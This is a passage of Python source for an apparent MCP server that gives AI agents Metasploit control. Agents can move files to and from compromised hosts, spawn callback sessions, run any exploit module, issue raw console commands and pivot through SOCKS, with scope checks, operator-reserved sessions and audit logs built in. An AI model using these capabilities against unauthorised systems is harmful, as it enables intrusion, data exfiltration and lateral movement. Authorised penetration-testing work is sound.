    def upload(session_id: str = "", local_path: str = "", remote_path: str = "") -> str:
        """Upload a file to a Meterpreter session target.

        Args:
            session_id: Meterpreter session ID. Required.
            local_path: Local file to upload. Required.
            remote_path: Destination path on target. Required.
        """
        if not session_id or not local_path or not remote_path:
            return "ERROR: session_id, local_path, and remote_path are required."
        if not Path(local_path).exists():
            return f"ERROR: Local file not found: {local_path}"
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            out = session.run_with_output(f"upload {local_path} {remote_path}", timeout=120)
            return json.dumps(
                {"status": "uploaded", "remote_path": remote_path, "output": out}
            )
        except Exception as e:
            return f"ERROR: Upload failed: {e}"

    @mcp.tool()
    @_serialized
    def download(session_id: str = "", remote_path: str = "", local_path: str = "") -> str:
        """Download a file from a Meterpreter session target.

        Saved under engagement/evidence/ by default.

        Args:
            session_id: Meterpreter session ID. Required.
            remote_path: File path on target. Required.
            local_path: Local destination (default engagement/evidence/<name>).
        """
        if not session_id or not remote_path:
            return "ERROR: session_id and remote_path are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        if not local_path:
            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)
            local_path = str(evidence_dir / (Path(remote_path).name or "download"))
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            out = session.run_with_output(f"download {remote_path} {local_path}", timeout=120)
            return json.dumps(
                {"status": "downloaded", "remote_path": remote_path,
                 "local_path": local_path, "output": out}
            )
        except Exception as e:
            return f"ERROR: Download failed: {e}"

    @mcp.tool()
    @_serialized
    def ifconfig(session_id: str = "") -> str:
        """List network interfaces on a Meterpreter session target (pivot detection).

        Args:
            session_id: Meterpreter session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            return json.dumps(
                {"session_id": str(session_id),
                 "output": session.run_with_output("ifconfig", timeout=30)}
            )
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_serialized
    def kill_session(session_id: str = "") -> str:
        """Terminate a Metasploit session.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            session.stop()
            return json.dumps({"status": "killed", "session_id": str(session_id)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Operator-reserved sessions ──────────────────────────────────

    @mcp.tool()
    @_serialized
    def reserve_operator_session(session_id: str = "", note: str = "operator") -> str:
        """Reserve an existing session for the HUMAN OPERATOR.

        Agent-facing session tools (execute, upload, download, ifconfig,
        upgrade_to_meterpreter, kill_session, start_socks_proxy) then REFUSE to
        act on it, so the operator can drive it in the tmux msfconsole without
        contending with the agents. Reversible with release_operator_session.

        Args:
            session_id: Session ID to hand to the operator. Required.
            note: Free-text label (e.g. which host / why). Default "operator".
        """
        if not session_id:
            return "ERROR: session_id is required."
        client, err = _require_client()
        if err:
            return err
        if str(session_id) not in {str(k) for k in client.sessions.list}:
            return f"ERROR: Session {session_id} not found or dead."
        reserved = _load_reserved()
        reserved[str(session_id)] = {
            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "note": note,
        }
        _save_reserved(reserved)
        return json.dumps({"status": "reserved", "session_id": str(session_id), "note": note})

    @mcp.tool()
    @_serialized
    def release_operator_session(session_id: str = "") -> str:
        """Release an operator-reserved session back to the agents."""
        if not session_id:
            return "ERROR: session_id is required."
        reserved = _load_reserved()
        existed = reserved.pop(str(session_id), None) is not None
        _save_reserved(reserved)
        return json.dumps({"status": "released" if existed else "not_reserved",
                           "session_id": str(session_id)})

    def _spawn_sibling(session_id: str, lhost: str, lport: int, label: str) -> dict:
        """Shared spawn primitive: re-stage a fresh session from a SHELL foothold
        via shell_to_meterpreter and return the new session id. Returns a dict:
        {new_sid} on success, or {needs_manual|unconfirmed|error} otherwise.

        Locking is fine-grained: the RPC lock is held only for the pre-checks +
        module launch and for each brief poll read, and RELEASED during the 1s
        sleeps. Holding it across the whole ~30s poll would block every other
        teammate's Metasploit call for the duration of a spawn — so the spawn
        tools are intentionally NOT @_serialized; this function serializes just
        its own RPC touches.
        """
        try:
            validate_option_value(lhost)
        except ValidationError as e:
            return {"error": f"{e}"}
        with _rpc_lock:
            client, err = _require_client()
            if err:
                return {"error": err}
            sessions = client.sessions.list
            if str(session_id) not in {str(k) for k in sessions}:
                return {"error": f"Session {session_id} not found or dead."}
            key = int(session_id) if str(session_id).isdigit() else session_id
            stype = str(sessions[key].get("type", ""))
            if "meterpreter" in stype.lower():
                return {"needs_manual": (
                    "Source is a Meterpreter session — can't re-stage a sibling from "
                    "here. Catch another callback (or open one in tmux) and reserve/"
                    "assign it manually."
                )}
            before = {str(k) for k in sessions}
            try:
                mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
                mod["SESSION"] = int(session_id)
                mod["LHOST"] = lhost
                mod["LPORT"] = int(lport)
                result = mod.execute()
                err_msg = _execute_error(result, expect_job=True)
                _log_module_call(
                    tool=f"spawn_sibling({label})",
                    module="post/multi/manage/shell_to_meterpreter",
                    module_type="post",
                    options={"SESSION": int(session_id), "LHOST": lhost, "LPORT": int(lport)},
                    result={"error": err_msg} if err_msg else result,
                    job_id=result.get("job_id") if isinstance(result, dict) and not err_msg else None,
                )
                if err_msg:
                    return {"error": f"{label} spawn failed: {err_msg}"}
            except Exception as e:
                return {"error": f"{label} spawn failed: {e}"}
        # Poll for the new session WITHOUT holding the lock across sleeps —
        # reacquire briefly for each read so other teammates' calls interleave.
        for _ in range(30):
            time.sleep(1)
            with _rpc_lock:
                now = {str(k) for k in client.sessions.list}
            fresh = now - before
            if fresh:
                return {"new_sid": sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]}
        return {"unconfirmed": result.get("job_id")}

    @mcp.tool()
    # NOT @_serialized — the RPC work is inside _spawn_sibling, which locks
    # per-op and releases during its poll so a spawn doesn't block other
    # teammates' Metasploit calls for ~30s.
    def spawn_session(session_id: str = "", lhost: str = "", lport: int = 0) -> str:
        """Spawn a SECOND session from a foothold for a DIFFERENT AGENT to use.

        Use this so two agents never drive the same session's shell at once
        (their commands and any interactive/stateful state would collide). When
        an agent needs to interact with a host another agent already has, spawn
        it its own session here and hand back the new id. Not reserved — it's a
        normal agent session.

        Reliable from a SHELL source (re-stages via shell_to_meterpreter); from
        a Meterpreter source returns needs_manual (no shell to re-stage).

        Args:
            session_id: An existing foothold session on the host. Required.
            lhost: Callback host for the new session. Required.
            lport: Callback port — use one distinct from other handlers. Required.
        """
        if not session_id or not lhost or not lport:
            return "ERROR: session_id, lhost, and lport are required."
        r = _spawn_sibling(session_id, lhost, int(lport), "Agent-session")
        if "error" in r:
            return f"ERROR: {r['error']}"
        if "needs_manual" in r:
            return json.dumps({"status": "needs_manual", "message": r["needs_manual"]})
        if "unconfirmed" in r:
            return json.dumps({"status": "spawn_started_unconfirmed", "job_id": r["unconfirmed"],
                               "message": "No new session within 30s — poll list_sessions."})
        return json.dumps({"status": "spawned", "session_id": r["new_sid"],
                           "from_session_id": str(session_id)})

    @mcp.tool()
    # NOT @_serialized — see spawn_session; _spawn_sibling locks per-op so the
    # poll doesn't hold the global RPC lock.
    def spawn_operator_session(session_id: str = "", lhost: str = "", lport: int = 4444) -> str:
        """Spawn a SECOND session from a foothold and reserve it for the operator.

        Call this once per host right after a foothold so the operator always
        has a dedicated session to interact with while the agents keep working
        the original — no contention on a single shell.

        Reliable path (source is a shell): runs
        post/multi/manage/shell_to_meterpreter to spawn a fresh Meterpreter
        session, which is then reserved. For a Meterpreter-origin foothold there
        is no shell to re-stage from here, so this returns needs_manual — catch
        a second callback yourself (or attach one in tmux) and call
        reserve_operator_session on it.

        Args:
            session_id: The foothold session to spawn a sibling from. Required.
            lhost: Callback host for the new session's stager. Required.
            lport: Callback port for the new session (default 4444). Use a port
                   distinct from the agents' handlers.
        """
        if not session_id or not lhost:
            return "ERROR: session_id and lhost are required."
        r = _spawn_sibling(session_id, lhost, int(lport), "Operator-session")
        if "error" in r:
            return f"ERROR: {r['error']}"
        if "needs_manual" in r:
            return json.dumps({
                "status": "needs_manual",
                "message": r["needs_manual"] + " Then call reserve_operator_session on it.",
            })
        if "unconfirmed" in r:
            return json.dumps({
                "status": "spawn_started_unconfirmed",
                "job_id": r["unconfirmed"],
                "message": ("Spawn launched but no new session appeared within 30s. "
                            "Poll list_sessions; reserve it with reserve_operator_session."),
            })
        new_sid = r["new_sid"]
        reserved = _load_reserved()
        reserved[new_sid] = {
            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "note": f"operator (spawned from session {session_id})",
        }
        _save_reserved(reserved)
        return json.dumps({
            "status": "reserved",
            "operator_session_id": new_sid,
            "from_session_id": str(session_id),
            "message": f"Session {new_sid} spawned and reserved for the operator.",
        })

    # ── Generic module execution (scope-gated on RHOSTS) ────────────

    @mcp.tool()
    @_serialized
    def run_module(
        module_type: str = "",
        module_name: str = "",
        options: str = "{}",
        payload: str = "",
        as_job: bool = True,
    ) -> str:
        """Run any Metasploit module (exploit, auxiliary, post).

        Remote targets (RHOSTS/RHOST in options) are validated against
        engagement/scope.allow — out-of-scope targets are refused.

        Args:
            module_type: exploit | auxiliary | post. Required.
            module_name: Module path, e.g. "windows/smb/ms17_010_eternalblue".
                         Required.
            options: JSON object of datastore options, e.g.
                     '{"RHOSTS": "10.10.10.5", "RPORT": 445}'. Required for
                     most modules.
            payload: Payload name (exploit modules only).
            as_job: Run in the background as a job (default true).
        """
        if not module_type or not module_name:
            return "ERROR: module_type and module_name are required."
        try:
            validate_module_type(module_type)
            validate_module_name(module_name)
            opts = json.loads(options) if options else {}
            if not isinstance(opts, dict):
                return "ERROR: options must be a JSON object."
        except (ValidationError, json.JSONDecodeError) as e:
            return f"ERROR: {e}"

        # Scope gate on remote targets.
        for key in ("RHOSTS", "RHOST", "rhosts", "rhost"):
            if key in opts and opts[key]:
                for tgt in str(opts[key]).replace(",", " ").split():
                    try:
                        check_scope(tgt, _PROJECT_ROOT)
                    except ScopeError as e:
                        return f"ERROR: {e}"

        client, err = _require_client()
        if err:
            return err
        try:
            mod = client.modules.use(module_type, module_name)
            for k, v in opts.items():
                validate_option_value(str(v))
                mod[k] = v
            if payload:
                validate_module_name(payload)
                pay = client.modules.use("payload", payload)
                # Same msfrpcd AutoLoadExtensions bug worked around in
                # start_handler — set it explicitly, but only when the payload
                # actually exposes the option (non-Meterpreter payloads don't,
                # and setting an unknown option would itself error).
                try:
                    if "AutoLoadExtensions" in getattr(pay, "options", []):
                        pay["AutoLoadExtensions"] = True
                except Exception:
                    pass
                result = mod.execute(payload=pay)
            else:
                result = mod.execute()
            # expect_job stays False: auxiliary/post modules legitimately
            # return no job_id, so only an explicit error dict is a failure
            # here. (The null-job_id check is for always-background jobs like
            # handlers and the SOCKS proxy.)
            err_msg = _execute_error(result)
            if err_msg:
                _log_module_call(
                    tool="run_module", module=module_name, module_type=module_type,
                    options={**opts, **({"PAYLOAD": payload} if payload else {})},
                    result={"error": err_msg},
                )
                return f"ERROR: Module execution failed: {err_msg}"
            _log_module_call(
                tool="run_module", module=module_name, module_type=module_type,
                options={**opts, **({"PAYLOAD": payload} if payload else {})},
                result=result,
                job_id=result.get("job_id") if isinstance(result, dict) else None,
            )
            return json.dumps({"status": "executed", "module": module_name, "result": result})
        except ValidationError as e:
            return f"ERROR: {e}"
        except Exception as e:
            return f"ERROR: Module execution failed: {e}"

    # ── Raw console (scope-gated on `set RHOSTS`) ───────────────────

    @mcp.tool()
    @_serialized
    def console_exec(command: str = "", read_timeout: int = 30) -> str:
        """Run raw msfconsole command(s) and return the output.

        Use run_module for structured execution; this is the flexibility escape
        hatch. Any `set RHOSTS`/`set RHOST` line is scope-checked against
        engagement/scope.allow before running — out-of-scope targets are refused.

        Args:
            command: One or more console commands separated by newlines. Required.
            read_timeout: Max seconds to wait for output. Default 30.
        """
        if not command:
            return "ERROR: command is required."
        import re

        for line in command.splitlines():
            m = re.match(r"\s*set\s+(?:g\s+)?rhosts?\s+(.+)", line, re.IGNORECASE)
            if m:
                for tgt in m.group(1).replace(",", " ").split():
                    try:
                        check_scope(tgt, _PROJECT_ROOT)
                    except ScopeError as e:
                        return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            console = client.consoles.console()
            console.write(command)
            deadline = time.time() + max(1, read_timeout)
            output = ""
            while time.time() < deadline:
                chunk = console.read()
                output += chunk.get("data", "")
                if not chunk.get("busy"):
                    time.sleep(0.5)
                    tail = console.read()
                    output += tail.get("data", "")
                    if not tail.get("busy"):
                        break
                time.sleep(0.5)
            try:
                client.consoles.destroy(console.cid)
            except Exception:
                pass
            return json.dumps({"status": "executed", "output": output})
        except Exception as e:
            return f"ERROR: Console execution failed: {e}"

    # ── Pivoting: scoped route + SOCKS ──────────────────────────────

    @mcp.tool()
    @_serialized
    def start_socks_proxy(
        session_id: str = "",
        target_subnet: str = "",
        srvport: int = 1080,
        allow_autoadd: bool = False,
        confirm_no_alternative: bool = False,
        alternative_rejection_reason: str = "",
    ) -> str:
        """FALLBACK pivot — refuses to run unless the caller certifies no alternative fits.

        PEN-AGENT's primary pivot path is the `pivoting-tunneling` skill
        (chisel / ligolo-ng / sshuttle / native SSH `-D`/`-L`). The
        in-Framework `auxiliary/server/socks_proxy` has repeatedly broken
        engagements: when its underlying session dies the relay doesn't
        auto-tear-down and the next RPC touching the orphaned job wedges the
        shared command dispatch (full msfconsole restart to recover). This
        tool therefore **refuses to run** unless the caller passes
        `confirm_no_alternative=True` AND a one-line
        `alternative_rejection_reason` explaining which alternative was ruled
        out and why.

        Legitimate rejection reasons (one of these must be true):
          - "no attackbox inbound: pivot can't reach any chisel/SSH listener"
          - "can't drop a binary on target: <policy / write-blocked FS / EDR>"
          - "need every MSF module to route transparently without proxychains"
          - "attempted ligolo-ng/chisel/sshuttle and all failed: <specifics>"

        If NONE of the above hold, do not call this tool — load the
        `pivoting-tunneling` skill and use chisel / ligolo-ng / sshuttle /
        SSH `-D` instead.

        When permitted to proceed, this adds a route for ONLY `target_subnet`
        through the session (`post/multi/manage/autoroute` with `CMD=add` +
        explicit `SUBNET` / `NETMASK`) and starts an
        `auxiliary/server/socks_proxy` job bound to 127.0.0.1. Never
        `CMD=autoadd` on a multi-homed pivot — it enumerates every pivot
        interface and routes agent traffic through subnets you did not scope.

        Args:
            session_id: Meterpreter session ID on the pivot host. Required.
            target_subnet: CIDR of the internal subnet to route through this
                session, e.g. "172.16.8.0/24". Required unless `allow_autoadd=
                True` is passed as an explicit opt-in. Must be covered by
                engagement/scope.allow.
            srvport: Local SOCKS port (default 1080).
            allow_autoadd: Fallback-of-the-fallback escape hatch — if True
                and `target_subnet` is empty, run the legacy `CMD=autoadd`
                (enumerate every pivot interface). Only use when you
                genuinely need every reachable subnet AND the pivot host has
                a single network interface. Response carries a `warning`
                field reminding you this path risks out-of-scope traffic.
            confirm_no_alternative: Required True to run. Setting it certifies
                that the pivoting-tunneling skill's chisel / ligolo-ng /
                sshuttle / SSH `-D` options have been considered and are
                genuinely not viable for this pivot.
            alternative_rejection_reason: One line (>= 20 chars) explaining
                which alternative was ruled out and why. Required when
                confirm_no_alternative=True. Written to the module-call log
                (engagement/evidence/msf-modules/) for the operator's audit
                trail.
        """
        if not session_id:
            return "ERROR: session_id is required."

        # Gate 0 (strongest): refuse unless the caller explicitly certified no
        # alternative. This is a code-level enforcement of the methodology
        # rule, because the "FALLBACK" labels in docs weren't stopping agents
        # from defaulting here.
        if not confirm_no_alternative:
            return (
                "ERROR: start_socks_proxy refuses to run without "
                "confirm_no_alternative=True.\n"
                "\n"
                "The in-Framework SOCKS proxy has repeatedly broken "
                "engagements (dead relay wedges the shared RPC → full "
                "msfconsole restart to recover). Use the pivoting-tunneling "
                "skill INSTEAD: chisel / ligolo-ng (with the operator-free "
                "pen-agent-ligolo helpers if installed) / sshuttle / "
                "native SSH -D / -L. See skills/network/pivoting-tunneling.\n"
                "\n"
                "If — and ONLY if — every alternative is ruled out for this "
                "specific pivot (no attackbox inbound to pivot; can't drop a "
                "binary on target; or you specifically need every MSF module "
                "to route transparently without proxychains), re-invoke with:\n"
                "  confirm_no_alternative=True\n"
                "  alternative_rejection_reason='<which alternative, why not viable>'"
            )
        if len(alternative_rejection_reason.strip()) < 20:
            return (
                "ERROR: alternative_rejection_reason must be a one-line "
                "explanation (>= 20 chars) of which pivoting-tunneling "
                "alternative was ruled out and why — e.g.:\n"
                "  'ligolo-ng agent won't execute: target has non-exec /tmp "
                "and no writable alternative'\n"
                "  'no attackbox inbound: pivot behind strict egress-only "
                "firewall; chisel/SSH can't reach us'"
            )

        if not target_subnet and not allow_autoadd:
            return (
                "ERROR: target_subnet is required (CIDR, e.g. '172.16.8.0/24'). "
                "Un-scoped autoroute (CMD=autoadd) on a multi-homed pivot pulls "
                "in every pivot interface and routes agent traffic out of scope. "
                "Pass target_subnet explicitly, or set allow_autoadd=True only "
                "if you genuinely want the autoadd fallback."
            )
        guard = _reserved_guard(session_id)
        if guard:
            return guard

        # Audit record: log the rejection reason BEFORE any RPC work so even a
        # subsequent failure leaves evidence of why the fallback was taken.
        _log_module_call(
            tool="start_socks_proxy", module="(preflight)",
            module_type="meta",
            options={"session_id": str(session_id),
                     "target_subnet": target_subnet,
                     "allow_autoadd": bool(allow_autoadd),
                     "confirm_no_alternative": True,
                     "alternative_rejection_reason": alternative_rejection_reason.strip()},
            result={"status": "fallback_authorized"},
        )

        # Validate + decompose the CIDR into SUBNET + NETMASK for autoroute's
        # scoped `CMD=add`. ipaddress raises ValueError on garbage input (bad
        # CIDR, host bits set with strict=True, non-IPv4). Keep the error
        # terse so the caller sees exactly what was rejected.
        subnet_arg = ""
        netmask_arg = ""
        if target_subnet:
            try:
                import ipaddress
                net = ipaddress.ip_network(str(target_subnet).strip(), strict=False)
                if net.version != 4:
                    return "ERROR: target_subnet must be IPv4 (msfrpcd autoroute requires it)."
                subnet_arg = str(net.network_address)
                netmask_arg = str(net.netmask)
            except ValueError as e:
                return f"ERROR: invalid target_subnet '{target_subnet}': {e}"
            # Scope gate: the subnet we're about to route must be in-scope.
            try:
                check_scope(subnet_arg, _PROJECT_ROOT)
            except ScopeError as e:
                return f"ERROR: {e}"

        client, err = _require_client()
        if err:
            return err
        try:
            auto = client.modules.use("post", "multi/manage/autoroute")
            auto["SESSION"] = int(session_id)
            if target_subnet:
                auto["CMD"] = "add"
                auto["SUBNET"] = subnet_arg
                auto["NETMASK"] = netmask_arg
                auto_opts = {"SESSION": int(session_id), "CMD": "add",
                             "SUBNET": subnet_arg, "NETMASK": netmask_arg}
            else:
                auto["CMD"] = "autoadd"
                auto_opts = {"SESSION": int(session_id), "CMD": "autoadd"}
            auto_result = auto.execute()
            auto_err = _execute_error(auto_result)
            _log_module_call(
                tool="start_socks_proxy", module="post/multi/manage/autoroute",
                module_type="post", options=auto_opts,
                result={"error": auto_err} if auto_err else auto_result,
            )
            if auto_err:
                return f"ERROR: autoroute failed, no routes added: {auto_err}"

            socks = client.modules.use("auxiliary", "server/socks_proxy")
            socks["SRVHOST"] = "127.0.0.1"
            socks["SRVPORT"] = int(srvport)
            socks["VERSION"] = "5"
            result = socks.execute()
            # The SOCKS proxy always runs as a background job — a null job_id /
            # error dict means it never bound, so don't report a usable
            # endpoint the caller would then try (and fail) to proxy through.
            err_msg = _execute_error(result, expect_job=True)
            _log_module_call(
                tool="start_socks_proxy", module="auxiliary/server/socks_proxy",
                module_type="auxiliary",
                options={"SRVHOST": "127.0.0.1", "SRVPORT": int(srvport), "VERSION": "5"},
                result={"error": err_msg} if err_msg else result,
                job_id=result.get("job_id") if isinstance(result, dict) and not err_msg else None,
            )
            if err_msg:
                return f"ERROR: Failed to start SOCKS proxy: {err_msg}"
            payload = {
                "status": "started",
                "session_id": str(session_id),
                "job_id": result.get("job_id"),
                "port": int(srvport),
                "endpoint": f"socks5://127.0.0.1:{int(srvport)}",
                "proxychains_line": f"socks5 127.0.0.1 {int(srvport)}",
            }
            if target_subnet:
                payload["route"] = f"{subnet_arg}/{net.prefixlen}"
                payload["hint"] = (
                    f"Scoped route to {subnet_arg}/{net.prefixlen} added via "
                    "the pivot session. Use proxychains4 for tools."
                )
            else:
                payload["warning"] = (
                    "autoadd fallback used — routes added for EVERY interface "
                    "on the pivot host, including non-target NICs. On a "
                    "multi-homed host this routes agent traffic through "
                    "subnets you did not scope. Prefer passing target_subnet."
                )
                payload["hint"] = "Routes added via autoadd. Use proxychains4 for tools."
            return json.dumps(payload)
        except Exception as e:
            return f"ERROR: Failed to start SOCKS proxy: {e}"

    # ── Health route ────────────────────────────────────────────────

    from starlette.requests import Request
    from starlette.responses import Response

    @mcp.custom_route("/status", methods=["GET"])
    async def status(request: Request) -> Response:
        if _find_config() is None:
            body = json.dumps({"status": "not_configured", "sessions": 0})
        else:
            client = _get_client()
            if client is None:
                body = json.dumps({"status": "disconnected", "sessions": 0})
            else:
                try:
                    body = json.dumps(
                        {"status": "connected", "sessions": len(client.sessions.list)}
                    )
                except Exception:
                    body = json.dumps({"status": "error", "sessions": 0})
        return Response(content=body, media_type="application/json")

    return mcp


def main() -> None:
    create_server().run(transport="sse")


if __name__ == "__main__":
    main()
